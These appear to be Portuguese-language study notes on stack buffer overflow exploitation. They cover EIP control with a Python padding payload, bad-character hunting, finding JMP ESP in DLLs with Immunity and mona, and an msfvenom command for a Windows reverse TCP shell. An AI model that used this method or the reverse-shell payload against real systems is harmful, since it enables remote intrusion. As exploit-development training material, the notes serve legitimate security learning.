# pwoningfiasco

## informações básicas 
:bald_man:
_anotações de estudo sobre buffer over flow em ambientes linux e windows_
:bald_man: 
----------
:point_up: 

* analisar EIP apos enviar instrucao
* endereco EIP apontar topo stack = proxima instrucao
* _caso seja necessário utilizar uma ferramenta para automatizar esse processo_ !mona findmsp enter <- aponta para o endereço com o offset desejado (immunity debbugger)
----------
* _via burp > python -c 'print "A" * 780 + "BBBB" + "C" * (1000-784)'_
* enviar no ponto vulneravel apos identificado
* Dados = "A" * 780 + "BBBB" + "C" * (1200 - 784)
* ESP = espaco para colocar em shell code 
* Ter controle de eip
----------

### encontrando badchars 

* pegar lista de bad chars
* remover 00 por ser um byte problematico
* acrescentar um array definindo os caracteres problematicos (em hexa) _em bad = ("badchars.list")_
* mudar valores de dados para // dados = "A" * 780 + "BBBB" + bad \\

* atingiu endereço EIP > analisar o que há em ESP 
* Procurar quais caracteres problemáticos estão em nossa lista, e após encontrados remove-los do nosso shellcode. Shellcode carrega os dados até FF, então utilizaremos ele como referência.
-----

### identificando espaco para shell code

----- 
* É necessário ter pelo menos 351 bytes para criar o shellcode com auxilio do msfvenom, precisamos de espaço livre para o envio da shell, então é de importância que o endereço escolhido possa alocar esse espaço. Caso o endereço não consiga alocar tal quantidade de dados, é necessario encontrar um novo endereço ou realizar um egg hunt.
ver controle de EIP
endereço jmp < bom para apontar para o endereço desejado e.g. jmp ESP 

__controla EIP__ -- apontar para um ENDERECO FIXO QUE PULE PARA ESP e em ESP teremos o SHELLCODE
endereço fixo ? tem proteções? 
utilizar immunity para realizar o pulo com search for all commands in all modules e busque por JMP ESP 
Os dados relatados serão retornados ao usuário, logo, teremos o endereço de JMP ESP, e apontaremos nossa shellcode. 

Endereço do sistema operacional não é fixo, logo, teremos que testar as DDLs disponíveis.

Procurar por __JMP ESP__ em view code in cpu, isso será executado dentro da DLL que o programa detém. <- Lembrar que isso será feito na DLL.

* Procurar pela existência de mecanismos de segurança no programa ou em suas DLLs. 

### EXEMPLO
Mona modules
Rebase 
Safeseh 
ASLR

Após isso = 

Procurar e anotar o endereco vulneravel
e.g.  x010090c83 
breakpoint em jmp esp para testar execucao
codigo do xpl (shellcode) 
inserir end de retorno da forma inversa
x83 x0c x09 x10 
msfvenom -p windows/shell_reverse_tcp lhost=iplocal lport=porta -b badcharshere -f c 
shellcode = (shellcode here) 

send and done
